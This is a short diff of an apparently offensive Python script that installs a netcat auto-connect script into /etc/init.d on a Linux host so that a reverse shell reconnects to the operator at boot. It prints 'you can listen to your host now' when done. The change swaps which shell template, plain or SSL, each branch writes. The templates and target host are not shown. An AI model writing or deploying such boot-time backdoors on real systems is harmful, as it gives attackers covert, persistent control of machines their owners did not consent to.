@@ -38,7 +38,7 @@ if shell_type == "NC":  #add host and port to connect.sh to init.d
   cprint("[+]Adding NC auto connect script to init.d","green")
   try:
 	 f = open("/etc/init.d/connector.sh","w")
-	 f.write(sh_template)
+	 f.write(sh_template_ssl)
 	 f.close()
 	 cprint("[+]setup done ! you can listen to your host now","blue")
   except:  
@@ -51,7 +51,7 @@ if shell_type == "NC":  #add host and port to connect.sh to init.d
   cprint("[+]Adding NC auto connect script to init.d","green")
   try:
 	 f = open("/etc/init.d/connector.sh","w")
-	 f.write(sh_template_ssl)
+	 f.write(sh_template)
 	 f.close()
 	 cprint("[+]setup done ! you can listen to your host now","blue")
   except:  
